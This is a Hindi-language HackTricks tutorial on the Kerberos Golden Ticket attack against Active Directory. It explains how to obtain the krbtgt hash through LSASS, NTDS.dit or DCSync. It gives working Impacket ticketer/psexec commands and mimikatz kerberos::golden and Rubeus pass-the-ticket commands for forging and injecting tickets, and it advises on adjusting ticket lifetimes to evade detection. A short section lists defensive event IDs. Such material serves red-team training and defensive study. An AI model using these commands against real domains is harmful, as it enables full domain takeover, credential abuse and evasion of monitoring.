# सोने का टिकट

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा **PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## सोने का टिकट

**एक सोने का टिकट** हमला **किसी भी उपयोगकर्ता का अनुकरण करते हुए एक वैध टिकट ग्रांटिंग टिकट (TGT) का निर्माण** पर आधारित होता है जिसमें **एक्टिव डायरेक्टरी (AD) krbtgt खाते के NTLM हैश का उपयोग** किया जाता है। यह तकनीक विशेष रूप से फायदेमंद है क्योंकि यह **अनुकृत उपयोगकर्ता के रूप में डोमेन के किसी भी सेवा या मशीन तक पहुंचने की सुविधा प्रदान करता है**। यह याद रखना महत्वपूर्ण है कि **krbtgt खाते के क्रेडेंशियल्स स्वचालित रूप से अपडेट नहीं होते हैं**।

**krbtgt खाते के NTLM हैश** को प्राप्त करने के लिए विभिन्न तरीके अपनाए जा सकते हैं। इसे **लोकल सुरक्षा प्राधिकरण उपस्थिति सेवा (LSASS) प्रक्रिया** से निकाला जा सकता है या डोमेन के किसी भी डोमेन कंट्रोलर (DC) पर स्थित **NT निर्देशिका सेवाएं (NTDS.dit) फ़ाइल** से। इसके अतिरिक्त, **DCsync हमला चलाना** इस NTLM हैश को प्राप्त करने के लिए एक और रणनीति है, जिसे **Mimikatz में lsadump::dcsync मॉड्यूल** या Impacket द्वारा **secretsdump.py स्क्रिप्ट** का उपयोग करके किया जा सकता है। इसे ध्यान में रखना महत्वपूर्ण है कि इन ऑपरेशनों को आगे बढ़ाने के लिए **डोमेन व्यवस्थापक विशेषाधिकार या एक समान स्तर की पहुंच आम तौर पर आवश्यक होती है**।

हालांकि NTLM हैश इस उद्देश्य के लिए एक व्यावहारिक विधि के रूप में काम करता है, इसे **संचालन सुरक्षा कारणों** के लिए **उन्नत एन्क्रिप्शन मानक (AES) केरबेरोस कुंजियों (AES128 और AES256) का उपयोग करके टिकट जाली बनाने की सलाह दी जाती है**।

{% code title="लिनक्स से" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="From Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**एक बार** जब आपके पास **गोल्डन टिकट इंजेक्ट** हो जाए, तो आप साझा फ़ाइलों **(C$)** तक पहुँच सकते हैं, और सेवाएं और WMI को निष्पादित कर सकते हैं, इसलिए आप **psexec** या **wmiexec** का उपयोग करके शैल प्राप्त कर सकते हैं (ऐसा लगता है कि आप विनर्म के माध्यम से शैल प्राप्त नहीं कर सकते हैं)।

### सामान्य पकड़ों को छलना

गोल्डन टिकट को पकड़ने के सबसे आम तरीके हैं **तार पर करबेरोस ट्रैफ़िक की जांच** करके। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 वर्षों के लिए साइन करता है**, जो इसके साथ किए गए आगामी TGS अनुरोधों में विचित्र रूप से प्रकट होगा।

`आयु : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

आरंभ ऑफसेट, अवधि और अधिकतम नवीकरणों को नियंत्रित करने के लिए `/startoffset`, `/endin` और `/renewmax` पैरामीटर का उपयोग करें (सभी मिनट में)।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```
दुर्भाग्य से, TGT का जीवनकाल 4769 में लॉग नहीं किया गया है, इसलिए आप विंडोज इवेंट लॉग्स में इस जानकारी को नहीं पाएंगे। हालांकि, आप कर सकते हैं **4768 के पूर्व 4769 देखना**। एक TGT के बिना एक TGS का अनुरोध करना **संभव नहीं है**, और अगर किसी TGT के जारी होने का कोई रिकॉर्ड नहीं है, तो हम यह समझ सकते हैं कि यह ऑफलाइन जाली बनाया गया था।

इस डिटेक्शन की जांच को **छलांग देने** के लिए डायमंड टिकट्स की जांच करें:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### सुरक्षा उपाय

* 4624: खाता लॉगऑन
* 4672: व्यवस्थापक लॉगऑन
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

रक्षकों के लिए अन्य छोटे तरीके हैं **4769 के लिए चेतावनी देना संवेदनशील उपयोगकर्ताओं** जैसे कि डिफ़ॉल्ट डोमेन प्रशासक खाता।

## संदर्भ
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
```
